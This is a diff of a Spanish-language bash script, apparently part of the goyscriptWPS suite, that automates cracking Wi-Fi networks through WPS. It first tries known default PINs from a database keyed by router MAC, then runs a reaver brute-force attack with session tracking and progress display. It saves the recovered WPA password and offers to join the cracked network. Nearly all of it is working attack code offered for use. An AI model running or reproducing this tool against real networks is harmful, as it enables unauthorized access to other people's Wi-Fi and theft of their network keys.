+	if [ ! -e "$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" ]
+	then
+		organizar_PINS # ORGANIZA EL FICHERO "PINs.goy"
+		FICHADO=`grep "$MAC_AP_3PARES" "$PINS"` # COMPRUEBA SI LA MAC DEL AP ESTÁ EN LA BASE DE DATOS
+		if [ "$FICHADO" != "" ]
+		then
+			let CUANTOS=`echo "$FICHADO" | wc -l` # PARA SABER CUANTOS PINS HAY PARA LA MAC DEL AP
+			if [ $CUANTOS -eq 1 ]
+			then
+				echo -e $verdeC"  Se ha encontrado$blanco 1$verdeC pin conocido en la base de datos."
+			else
+				echo -e $verdeC"  Se han encontrado$blanco $CUANTOS$verdeC pins conocidos en la base de datos."
+			fi
+			echo
+			let CONT=1
+			while [ $CONT -le $CUANTOS ]
+			do
+				PIN_A_PROBAR=`echo "$FICHADO" | sed -n ${CONT}p | awk -F '-' '{print $2}'`
+				echo -en $cyanC"  Probando pin conocido [$CONT de $CUANTOS]: $blanco$PIN_A_PROBAR$cyanC... "
+				probar_un_solo_pin
+				sleep 2
+				let CONT=$CONT+1
+				if [ -e "$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" ]
+				then
+					echo -e $verdeC"PIN CORRECTO"
+					echo -e $grisC
+					break
+				else
+					echo -e $rojoC"PIN INCORRECTO"
+					echo -e $grisC
+				fi
+			done
+		else
+			echo -e $rojoC"  El AP seleccionado no figura en la base de datos de pins conocidos."
+			echo
+		fi
+	fi
+	if [ ! -e "$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" ]
+	then
+		echo -e $rojoC"  Los ataques con pin específico no han dado resultado."
+		echo
+	fi
+fi
+sleep 1
+if [ ! -e "$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" ]
+then
+	if [ -e "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps" ]
+	then
+		  echo -e $cyanC"Continuando ataque estándar (fuerza bruta)..."
+	else
+		  echo -e $cyanC"Iniciando ataque estándar (fuerza bruta)..."
+	fi
+	echo
+	killall -q $REAVER > /dev/null 2>&1
+	if [ "$INTERFAZ_GRAFICA" = "SI" ]
+	then
+		xterm -iconic -e $REAVER -n -l61 -i $INTERFAZ_MONITOR -b $MAC_AP -c $CANAL -s "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps" -o "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).log" -vv -a >/dev/null 2>&1 &
+	else
+		$SCREEN -dm -t "reaver" $REAVER -n -l61 -i $INTERFAZ_MONITOR -b $MAC_AP -c $CANAL -s "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps" -o "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).log" -vv -a >/dev/null 2>&1
+	fi
+	echo "$NOMBRE_AP ($MAC_GUIONES)" > "$SESIONES/log_actual"
+	mostrar_numero_pines_probados &
+	if [ "$INTERFAZ_GRAFICA" = "NO" ] #parada de 1 segundo para forzar que se vea la ventana de reaver
+	then
+		sleep 2
+	fi
+	mostrar_log_reaver
+fi
+}
+
+#PRUEBA UN SOLO PIN CON 'reaver'.
+probar_un_solo_pin()
+{
+killall -q reaver > /dev/null 2>&1
+if [ "$INTERFAZ_GRAFICA" = "SI" ]
+then
+	xterm -iconic -e $REAVER -n -l61 -i $INTERFAZ_MONITOR -p $PIN_A_PROBAR -b $MAC_AP -c $CANAL -g 1 -s "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps" -o "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).log" -vv -a >/dev/null 2>&1 &
+else
+	sleep 1
+	$SCREEN -dm -t "reaver_un_pin" $REAVER -n -l61 -i $INTERFAZ_MONITOR -p $PIN_A_PROBAR -b $MAC_AP -c $CANAL -g 1 -s "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps" -o "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).log" -vv -a >/dev/null 2>&1
+fi
+echo "$NOMBRE_AP ($MAC_GUIONES)" > "$SESIONES/log_actual"
+mostrar_log_reaver
+rm -rf "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps"   # EN ESTA FUNCIÓN NO ES NECESARIO GUARDAR LA SESIÓN DE 'reaver', PERO SE HACE PARA EVITAR QUE LA GUARDE AUTOMÁTICAMENTE
+}                                                  # EN LA CARPETA DE TRABAJO POR DEFECTO. LUEGO LA BORRAMOS PARA EVITAR CONFLICTOS CON OTROS PROGRAMAS.
+
+#MIENTRAS SE EJECUTA 'reaver' SE MUESTRAN CUANTOS PINES HAN SIDO PROBADOS
+mostrar_numero_pines_probados()
+{
+sleep 2
+let PIN_SEG1=`date +%s`
+let PIN_SEG2=`date +%s`
+let PINES_ANTERIOR=0
+REAVER_FUNCIONANDO=`ps $PARAMETRO_PS | grep reaver | grep -v grep`
+if [ -e "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info" ]
+then
+	echo -e "\n\n\n\n\n\n\n"
+	if [ -e "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps" ] # SI EXISTE SESIÓN GUARDADA, MIRAREMOS LOS PINES PROBADOS GUARDADOS EN LA SESIÓN
+	then
+		let PIN1=`sed -n 1p "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps"`
+		let PIN2=`sed -n 2p "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps"`
+		let PINES_SESION_ANTERIOR=$PIN1+$PIN2
+	else
+		PINES_SESION_ANTERIOR=`cat "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info" | sed -n 1p` # SINÓ COGEREMOS EL GUARDADO EN EL ARCHIVO .info
+	fi
+	while [ "$REAVER_FUNCIONANDO" != "" ]
+	do
+		let PINES=`grep -e "Trying pin" -e "Probando pin" "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).log" | sort -u | wc -l`
+		if [[ $PINES -ne 0 ]]
+		then
+			let PINES=$PINES-1 #Para que muestre el valor de los pines probados (el actual se está "probando")
+		fi
+		let PINES_TOTAL=`expr $PINES + $PINES_SESION_ANTERIOR`
+		let ERRORES=`cat "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).log" | grep -e "0x02" -e "0x03" -e "0x04" | wc -l`
+		COMPLETADO=`cat "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).log" | grep $BINARY "%" | tail -n 1 | awk -F '%' '{print $1}' | sed 's/\[+\]//g' | sed 's/ //g' | sed 's/\./,/g'`
+		CONCOLOR=`echo "$COMPLETADO" | grep "m"`
+		if [[ "$CONCOLOR" != "" ]] #ELIMINA EL FORMATO DE COLOR AL PORCENTAJE SI LO TIENE
+		then
+			COMPLETADO=`echo $COMPLETADO | awk -F "m" '{print $2}'`
+		fi
+		RATIO=`cat "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).log" | grep $BINARY "%" | tail -n 1 | awk -F '(' '{print $2}' | awk -F " " '{print $1}'`
+		if [[ "$COMPLETADO" = "" ]]
+		then
+			COMPLETADO_ANTERIOR=`cat "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info" | sed -n 2p`
+			if [[ "$COMPLETADO_ANTERIOR" = "" ]]
+			then
+				COMPLETADO="?"
+			else
+				COMPLETADO=$COMPLETADO_ANTERIOR
+			fi
+			RATIO="$rojoC?"
+		fi
+		if [[ "$COMPLETADO" = "?" ]] || [[ "$COMPLETADO" = "0,00" ]]
+		then
+			COLOR="$rojoC"
+		else
+			let COMP_ENTERO=`echo "$COMPLETADO" | awk -F ',' '{print $1}'`
+			if [[ $COMP_ENTERO -ge 90 ]]
+			then
+				COLOR="$verdeC"
+			else
+				COLOR="$amarillo"
+			fi
+		fi
+		if [[ $PINES -ne 0 ]]
+		then
+			if [[ $PINES -eq $PINES_ANTERIOR ]]
+			then
+				let PIN_SEG2=`date +%s`
+			else
+				let PINES_ANTERIOR=$PINES
+				let PIN_SEG1=`date +%s`
+				let PIN_SEG2=`date +%s`
+			fi
+		fi
+		let DIF_SEG2_SEG1=`expr $PIN_SEG2 - $PIN_SEG1`
+		if [[ $DIF_SEG2_SEG1 -ge $UMBRAL_ULTIMO_PIN ]]
+		then
+			CUANTO_HACE_DESGLOSADO=`tiempo_ultimo_pin $DIF_SEG2_SEG1`
+			CUANTO_HACE_DEL_ULTIMO="$grisC(El último hace $amarillo$CUANTO_HACE_DESGLOSADO$grisC)"
+		else
+			CUANTO_HACE_DEL_ULTIMO=""
+		fi
+		if [ -e "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps" ] # MUESTRA EL MÁXIMO DE PINES RESTANTES POR PROBAR
+		then
+			EN_QUE_MITAD=`sed -n 3p "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps"`
+			if [[ "$EN_QUE_MITAD" = "0" ]]
+			then
+				if [[ "$CUMPLE_CHECKSUM" = "SI" ]]
+				then
+					let PIN1=`sed -n 1p "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps"`
+					let PINES_RESTANTES=11000-$PIN1-1
+				else
+					let PIN1=`sed -n 1p "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps"`
+					let PINES_RESTANTES=20000-$PIN1-1
+				fi
+			else
+				if [[ $EN_QUE_MITAD -eq 1 ]]
+				then
+					if [[ "$CUMPLE_CHECKSUM" = "SI" ]]
+					then
+						let PIN2=`sed -n 2p "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps"`
+						let PINES_RESTANTES=1000-$PIN2-1
+					else
+						let PIN2=`sed -n 2p "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps"`
+						let PINES_RESTANTES=10000-$PIN2-1
+					fi
+				fi
+			fi
+		else
+			PINES_RESTANTES="$rojoC?"
+		fi
+		echo -e "\033[8A" #SUBE EL CURSOR 8 FILAS
+		echo -e $cyanC"  PINs en esta sesión.....: $amarillo$PINES    $CUANTO_HACE_DEL_ULTIMO \033[K" # '\033[K' borra hasta el final de linea"
+		echo -e $cyanC"  PINs probados en total..: $blanco$PINES_TOTAL \033[K"
+		echo -e $cyanC"  PINs restantes..........: $amarillo$PINES_RESTANTES \033[K"
+		echo -e $cyanC"  Errores.................: $amarillo$ERRORES \033[K"
+		echo -e $cyanC"  Ratio...................: $amarillo$RATIO$amarillo segundos/pin \033[K"
+		echo -e $cyanC"  Completado..............: $COLOR$COMPLETADO$amarillo % \033[K"
+		echo -e
+		sleep 1
+		if [ -e "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps" ]
+		then
+			echo $PINES_TOTAL > "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info"
+			echo $COMPLETADO >> "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info"
+			if [[ "$CUMPLE_CHECKSUM" = "NO" ]]
+			then
+				echo "NO" >> "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info"
+			else
+				echo "SI" >> "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info"
+			fi
+		fi
+		REAVER_FUNCIONANDO=`ps $PARAMETRO_PS | grep reaver | grep -v grep`
+		if [[ "$COMPLETADO" = "99,99" ]]
+		then
+			CUMPLE_CHECKSUM="NO"
+			rm -rf "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).*" > /dev/null 2>&1
+			echo "0" > "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info"
+			echo "0" >> "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info"
+			echo "NO" >> "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info"
+			echo -e $rojoC"Se han probado todos los PINs que cumplen la norma 7+1 checksum."
+			echo -e $grisC
+			break
+		fi
+	  done
+else
+	echo -e "\n\n\n\n\n"
+	while [ "$REAVER_FUNCIONANDO" != "" ]
+	do
+		let PINES=`cat "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).log" | grep -e "Trying pin" -e "Probando pin" | sort -u | wc -l`
+		if [[ $PINES -ne 0 ]]
+		then
+			let PINES=$PINES-1 # CUANTOS PINs SE HAN PROBADO (el actual se está "probando")
+		fi
+		let ERRORES=`cat "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).log" | grep -e "0x02" -e "0x03" -e "0x04" | wc -l`
+		COMPLETADO=`cat "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).log" | grep $BINARY "%" | tail -n 1 | awk -F '%' '{print $1}' | sed 's/\[+\]//g' | sed 's/ //g' | sed 's/\./,/g'`
+		CONCOLOR=`echo "$COMPLETADO" | grep "m"`
+		if [[ "$CONCOLOR" != "" ]] #ELIMINA EL FORMATO DE COLOR AL PORCENTAJE SI LO TIENE
+		then
+			COMPLETADO=`echo $COMPLETADO | awk -F "m" '{print $2}'`
+		fi
+		RATIO=`cat "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).log" | grep $BINARY "%" | tail -n 1 | awk -F '(' '{print $2}' | awk -F " " '{print $1}'`
+		if [[ "$COMPLETADO" = "" ]]
+		then
+			COMPLETADO="?"
+			RATIO="$rojoC?"
+		fi
+		if [[ "$COMPLETADO" = "?" ]] || [[ "$COMPLETADO" = "0,00" ]]
+		then
+			COLOR="$rojoC"
+		else
+			let COMP_ENTERO=`echo "$COMPLETADO" | awk -F ',' '{print $1}'`
+			if [[ $COMP_ENTERO -ge 90 ]]
+			then
+				COLOR="$verdeC"
+			else
+				COLOR="$amarillo"
+			fi
+		fi
+		if [[ $PINES -ne 0 ]]
+		then
+			if [[ $PINES -eq $PINES_ANTERIOR ]]
+			then
+				let PIN_SEG2=`date +%s`
+			else
+				let PINES_ANTERIOR=$PINES
+				let PIN_SEG1=`date +%s`
+				let PIN_SEG2=`date +%s`
+			fi
+		fi
+		let DIF_SEG2_SEG1=`expr $PIN_SEG2 - $PIN_SEG1`
+		if [[ $DIF_SEG2_SEG1 -ge $UMBRAL_ULTIMO_PIN ]]
+		then
+			CUANTO_HACE_DESGLOSADO=`tiempo_ultimo_pin $DIF_SEG2_SEG1`
+			CUANTO_HACE_DEL_ULTIMO="$grisC(El último hace $amarillo$CUANTO_HACE_DESGLOSADO$grisC)"
+		else
+			CUANTO_HACE_DEL_ULTIMO=""
+		fi
+		if [ -e "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps" ] # MUESTRA EL MÁXIMO DE PINES RESTANTES POR PROBAR
+		then
+			EN_QUE_MITAD=`sed -n 3p "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps"`
+			if [[ "$EN_QUE_MITAD" = "0" ]]
+			then
+				if [[ "$CUMPLE_CHECKSUM" = "SI" ]]
+				then
+					let PIN1=`sed -n 1p "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps"`
+					let PINES_RESTANTES=11000-$PIN1-1
+				else
+					let PIN1=`sed -n 1p "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps"`
+					let PINES_RESTANTES=20000-$PIN1-1
+				fi
+			else
+				if [[ $EN_QUE_MITAD -eq 1 ]]
+				then
+					if [[ "$CUMPLE_CHECKSUM" = "SI" ]]
+					then
+						let PIN2=`sed -n 2p "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps"`
+						let PINES_RESTANTES=1000-$PIN2-1
+					else
+						let PIN2=`sed -n 2p "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps"`
+						let PINES_RESTANTES=10000-$PIN2-1
+					fi
+				fi
+			fi
+		else
+			if [[ "$CUMPLE_CHECKSUM" = "SI" ]]
+			then
+				let PINES_RESTANTES=11000-$PINES-1
+			else
+				let PINES_RESTANTES=20000-$PINES-1
+			fi
+		fi
+		echo -e "\033[6A" #SUBE EL CURSOR 6 FILAS
+		echo -e $cyanC"  PINs probados...........: $amarillo$PINES    $CUANTO_HACE_DEL_ULTIMO\033[K" # '\033[K' borra hasta el final de linea"
+		echo -e $cyanC"  PINs restantes..........: $amarillo$PINES_RESTANTES\033[K"
+		echo -e $cyanC"  Errores.................: $amarillo$ERRORES"
+		echo -e $cyanC"  Ratio...................: $amarillo$RATIO$amarillo segundos/pin\033[K"
+		echo -e $cyanC"  Completado..............: $COLOR$COMPLETADO$amarillo %\033[K"
+		sleep 1
+		if [ -e "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps" ]
+		then
+			echo $PINES > "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info"
+			echo $COMPLETADO >> "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info"
+			if [[ "$CUMPLE_CHECKSUM" = "NO" ]]
+			then
+				echo "NO" >> "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info"
+			else
+				echo "SI" >> "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info"
+			fi
+		fi
+		REAVER_FUNCIONANDO=`ps $PARAMETRO_PS | grep reaver | grep -v grep`
+		if [[ "$COMPLETADO" = "99,99" ]]
+		then
+			CUMPLE_CHECKSUM="NO"
+			rm -rf "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).*" > /dev/null 2>&1
+			echo "0" > "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info"
+			echo "0" >> "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info"
+			echo "NO" >> "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).info"
+			echo -e $rojoC"Se han probado todos los PINs que cumplen la norma 7+1 checksum."
+			echo -e $grisC
+			break
+		fi
+	done
+fi
+echo -e $cyanC
+echo
+}
+
+#MUESTRA EL LOG DE 'reaver" el cual esta corriendo en segundo plano
+#esto lo hago para poder guardar en un archivo txt la contraseña WPA cuando la encuentre
+mostrar_log_reaver()
+{
+while true
+do
+	if [ -e "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).log" ]
+	then
+		break
+	else
+		sleep 1
+	fi
+done
+if [ "$INTERFAZ_GRAFICA" = "SI" ]
+then
+	xterm $VENTANA_REAVER -title "Atacando la red \"$NOMBRE_AP\"" -e software/./goyscriptWPS.mostrar_log_reaver
+else
+	$SCREEN -t "Reaver" software/./goyscriptWPS.mostrar_log_reaver
+	REAVER_FUNCIONANDO=`ps $PARAMETRO_PS | grep reaver | grep -v grep`
+	while [ "$REAVER_FUNCIONANDO" != "" ]
+	do
+		sleep 1
+		REAVER_FUNCIONANDO=`ps $PARAMETRO_PS | grep reaver | grep -v grep`
+	done
+fi
+}
+
+#MUESTRA EL PIN Y LA CONTRASEÑA WPA AL FINALIZAR
+mostrar_password()
+{
+echo -e $grisC
+echo -e $verdeC$parpadeoON"¡¡¡ CONTRASEÑA ENCONTRADA !!!"$parpadeoOFF
+echo -e $blanco
+cat "$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt"
+echo -e $grisC
+echo "Contraseña guardada en el archivo"
+echo -e $cyanC"\"$NOMBRE_AP ($MAC_GUIONES).txt\""
+echo -e $grisC"dentro de la carpeta $blanco\"$CLAVES\"$grisC"
+echo
+}
+
+#ORDENA LA BASE DE DATOS DE PINS Y ELIMINA LAS MACs CUYO PIN ES GENERADO POR WPSPinGeneratorMOD y otras que se sabe que no tienen un PIN genérico
+organizar_PINS()
+{
+BORRAR_MACs=`$WPSPIN --macs 2>/dev/null | grep ":" | awk '{print $1}'` # GUARDA EN LA VARIABLE LAS MACs SOPORTADAS POR WPSPinGeneratorMOD
+grep -v -F "$BORRAR_MACs" "$PINS" > "$PINS.tmp1"	# BORRAMOS LAS LINEAS QUE CONTENGAN ALGUNA DE LAS MACs DE LA VARIABLE ANTERIOR
+BORRAR_MACs=`awk -F "-" '{print $1}' "$MACs_A_EXCLUIR"` # GUARDA EN LA VARIABLE LAS MACs DE LA BASE DE DATOS DE MACs A EXCLUIR
+grep -v -F "$BORRAR_MACs" "$PINS.tmp1" > "$PINS.tmp2"	# BORRAMOS LAS LINEAS QUE CONTENGAN ALGUNA DE LAS MACs DE LA VARIABLE ANTERIOR
+sort -u "$PINS.tmp2" > "$PINS"	# ORDENAMOS EL ARCHIVO Y ELIMINAMOS DUPLICADOS
+rm -rf "$PINS".tmp*  > /dev/null 2>&1	# BORRAMOS LOS ARCHIVOS TEMPORALES
+let CUANTAS_MAC=`cat "$PINS" | awk -F '-' '{print $1}' | sort -u | wc -l`
+let CUANTOS_PIN=`cat "$PINS" | wc -l`
+echo -e $cyanC"  BASE DE DATOS: $blanco$CUANTAS_MAC$verdeC MACs y $blanco$CUANTOS_PIN$verdeC PINs."
+echo -e $grisC
+}
+
+conectar_internet()
+{
+echo -en ""$cyan"¿Quieres conectarte a la red \"$NOMBRE_AP\"? [S/N]: ""$amarillo\c"
+read -n 1 RESPUESTA
+while [ "$RESPUESTA" != "s" ] && [ "$RESPUESTA" != "n" ] && [ "$RESPUESTA" != "S" ] && [ "$RESPUESTA" != "N" ]
+do
+	echo -en ""$rojoC"  OPCIÓN NO VÁLIDA  "
+	sleep 1
+	echo -en "$cyan""\r"¿Quieres conectarte a la red \"$NOMBRE_AP\"? [S/N]: "$amarillo\033[K\c"
+	read -n 1 RESPUESTA
+done
+if [ "$RESPUESTA" = "s" ] || [ "$RESPUESTA" = "S" ]
+then
+	echo -en "$cyan""\r"¿Quieres conectarte a la red \"$NOMBRE_AP\"? [S/N]: $amarillo"SÍ"
+	echo -e "$cyan\n"
+	echo -e "Configurando la tarjeta WiFi para conectarse a la red \"$NOMBRE_AP\"..."$grisC""
+	echo
+	killall -q dhcpcd dhclient udhcpc wpa_supplicant > /dev/null 2>&1
+	desactivar_todos_monX
+	LINEAS_CLAVE=$(cat "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" | wc -l)
+	if [ $LINEAS_CLAVE -eq 2 ] #SI EL TXT QUE CONTIENE LA CONTRASEÑA TIENE 2 LINEAS ES PORQUE SE DESENCRIPTÓ CON goyscriptWPS sinó con goyscriptWPA
+	then
+		CLAVE_WPA=$(cat "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" | sed -n 2p | awk -F "'" '{print $2}')
+	else
+		CLAVE_WPA=$(cat "./$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt")
+	fi
+	$WPA_PSK_RAW "$NOMBRE_AP" "$CLAVE_WPA" > "./$TMP/internet.conf" 2>/dev/null
+	wpa_supplicant -B -D wext -i $INTERFAZ -c "./$TMP/internet.conf" 2>/dev/null
+	sleep 1
+	echo -e ""$cyan"Iniciando cliente DHCP. Puede llevar un tiempo, ten paciencia..."$grisC"\n"
+	which dhcpcd > /dev/null 2>&1
+	if [ $? -eq 0 ]
+	then
+		dhcpcd $INTERFAZ > /dev/null 2>&1
+	else
+		which dhclient > /dev/null 2>&1
+		if [ $? -eq 0 ]
+		then
+			dhclient -r
+			dhclient $INTERFAZ
+		else
+			echo -e $rojoC"No se ha encontrado ningún cliente DHCP instalado."
+			echo -e $rojoC"No se ha podido realizar la conexión."
+			echo -e $grisC
+			matar_procesos "Cerrando los procesos abiertos..."
+			pulsar_una_tecla "Pulsa una tecla para salir..."
+		fi
+	fi
+	if [ $? != 0 ] #SI NO VA A LA SEGUNDA NO CREO QUE VAYA BIEN LA COSA :D
+	then
+		echo -e "$rojoC"
+		echo "No ha sido posible realizar la conexión."
+		echo "Probablemente estás demasiado lejos del punto de acceso."
+		echo -e "$grisC"
+	else
+		echo -e $verdeC"Configuración finalizada. Comprueba si tienes conexión."
+		echo -e "$grisC"
+		which firefox > /dev/null 2>&1
+		if [ $? -eq 0 ]
+		then
+			$(which firefox) www.google.es & > /dev/null 2>&1
+			echo -e "$verdeC"
+			echo "Abriendo \"Firefox\"..."
+			echo -e "$grisC"
+		else
+			which konqueror > /dev/null 2>&1
+			if [ $? -eq 0 ]
+			then
+				$(which konqueror) www.google.es & > /dev/null 2>&1
+				echo -e "$verdeC"
+				echo "Abriendo \"Konqueror\"..."
+				echo -e "$grisC"
+			else
+				echo -e $rojoC"No tienes instalado \"Firefox\" ni \"Konqueror\"."
+				echo -e "Si tienes algún otro navegador ejecútalo."
+				echo -e $grisC
+			fi
+		fi
+		echo -en $blanco"Pulsa \"D\" para desconectarte de $cyanC\"$NOMBRE_AP\"$blanco... $amarillo"
+		read -n 1 TECLA
+		while [[ "$TECLA" != "D" ]] && [[ "$TECLA" != "d" ]]
+		do
+			echo -en $rojoC"      OPCIÓN NO VÁLIDA  "
+			sleep 1
+			echo -en $blanco"\rPulsa \"D\" para desconectarte de $cyanC\"$NOMBRE_AP\"$blanco... $amarillo\033[K"
+			read -n 1 TECLA
+		done
+		echo -e $grisC
+		matar_procesos "Desconectando de $blanco\"$NOMBRE_AP\"$cyanC..."
+	fi
+else
+	echo -en "$cyan""\r"¿Quieres conectarte a la red \"$NOMBRE_AP\"? [S/N]: $amarillo"NO"
+fi
+echo -e "$grisC"
+echo
+}
+
+iniciar_reavermod()
+{
+killall -q $REAVER $REAVERMOD > /dev/null 2>&1
+if [ -e "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps" ]
+then
+	let TEMP=`cat "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps" | wc -l` # CUANTAS LINEAS TIENE EL ARCHIVO DE SESIÓN (11003 = reaver oficial, 20003 = reaver-wifislax)
+	if [ $TEMP -eq 11003 ] # SI LA SESIÓN FUE GENERADA POR REAVER OFICIAL ES QUE YA TENEMOS LA PRIMERA MITAD DEL PIN
+	then
+		let TEMP=`sed -n 2p "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps"`
+		if [ $TEMP -gt 0 ] # COMPRUEBA SI YA SE HA ENCONTRADO LA PRIMERA MITAD DEL PIN
+		then
+			let PRIMER_PIN=`sed -n 1p "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps"`
+			let PRIMER_PIN=$PRIMER_PIN+4
+			let PRIMER_PIN=`sed -n ${PRIMER_PIN}p "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps"`
+			PRIMER_PIN="-p $PRIMER_PIN"
+		fi
+	fi
+else
+	PRIMER_PIN="" # SI NO EXISTE EL ARCHIVO DE SESIÓN ENTONCES PARTIMOS DESDE EL PRINCIPIO
+fi
+if [ "$INTERFAZ_GRAFICA" = "SI" ]
+then
+	xterm -iconic -e $REAVERMOD -n -l 61 -i $INTERFAZ_MONITOR $PRIMER_PIN -b $MAC_AP -c $CANAL -s "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps" -o "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).log" -vv -a   > /dev/null 2>&1 &
+else
+	$SCREEN -dm -t "reavermod" $REAVERMOD -n -l 61 -i $INTERFAZ_MONITOR $PRIMER_PIN -b $MAC_AP -c $CANAL -s "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps" -o "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).log" -vv -a   > /dev/null 2>&1
+fi
+echo "$NOMBRE_AP ($MAC_GUIONES)" > "$SESIONES/log_actual"
+mostrar_numero_pines_probados &
+if [ "$INTERFAZ_GRAFICA" = "NO" ] #parada de 1 segundo para forzar que se vea la ventana de reaver
+then
+	sleep 1
+fi
+mostrar_log_reaver
+}
+
+borrar_temporales()
+{
+rm -rf *.db > /dev/null 2>&1
+}
+
+comprobar_distribucion()
+{
+DISTRIBUCION=$(./software/./distro_linux.sh)
+case "$DISTRIBUCION" in
+"<Desconocida>")
+	echo -e $rojoC"Distribución de Linux desconocida$grisC"
+	echo -e $grisC;;
+*)
+	echo -e $verdeC"Distribución de linux detectada: $blanco$DISTRIBUCION"
+	echo -e $grisC;;
+esac
+}
+
+comprobar_permisos_solo_lectura()
+{
+rm -rf "prueba_permisos" > /dev/null 2>&1
+mkdir "prueba_permisos" > /dev/null 2>&1
+if [ $? -ne 0 ]
+then
+	echo -e $grisC
+	echo -e $rojoC"  ERROR: El dispositivo está montado como sólo lectura"
+	echo -e $cyanC"         Prueba a volver a montarlo con:"
+	echo -e $cyanC"         mount -o remount,rw <punto_de_montaje>"
+	echo -e $grisC
+	echo -e $cyanC"         Ejemplo:"
+	echo -e $cyanC"             mount -o remount,rw /mnt/sdb1"
+	echo -e $grisC
+	pulsar_una_tecla "Pulsa una tecla para salir..."
+else
+	rm -rf "prueba_permisos" > /dev/null 2>&1
+fi
+}
+
+comprobar_root()
+{
+USUARIO=`whoami`
+if [ "$USUARIO" != "root" ]
+then
+	echo -e $grisC
+	echo -e $rojoC"ERROR: Necesitas permisos de root para poder"
+	echo -e $rojoC"       ejecutar este script"
+	echo -e $grisC
+	pulsar_una_tecla "Pulsa una tecla para salir..."
+fi
+}
+
+
+##### PROGRAMA PRINCIPAL #####
+
+version
+comprobar_permisos_solo_lectura
+if [ "$WRT" = "" ]
+then
+	comprobar_root
+fi
+INTERFAZ_GRAFICA=`ps $PARAMETRO_PS | grep -e goyscriptTTY -e goyscriptWRT | grep -v grep`
+if [ "$INTERFAZ_GRAFICA" = "" ]
+then
+	INTERFAZ_GRAFICA="SI"
+else
+	INTERFAZ_GRAFICA="NO"
+fi
+borrar_temporales
+if [ "$1" == "--help" ] || [ "$1" == "--ayuda" ] || [ "$1" == "/?" ]
+then
+	comprobar_ayuda
+fi
+
+if [ "$1" != "--datos" ]
+then
+	REST=`ps $PARAMETRO_PS | grep "restaurar_" | grep -v grep`
+	while [ "$REST" != "" ] #espera a que termine el script de restaurar los servicios (por si se ejecuta la suite dos veces muy seguidas)
+	do
+		REST=`ps $PARAMETRO_PS | grep "restaurar_" | grep -v grep`
+	done
+	DESDE_DATOS="NO"
+	matar_procesos " Iniciando..."
+	comprobar_distribucion
+	if [[ -e "/sys/class/net/$1/device/driver" ]]  #Para controlar si existe la interfaz pasada como parámetro.
+	then                                           #Si no existe, muestra las que hay para que seleccionemos una
+		INTERFAZ=$1
+	else
+		seleccionar_tarjeta
+	fi
+	mostrar_resolucion_de_pantalla
+	iniciar_tarjeta
+	activar_modo_monitor
+	LISTA=`echo "$*" | grep -w -e "-l" -e "-L"` # PARA CONTROLAR SI SE USÓ EL PARÁMETRO INDICADO
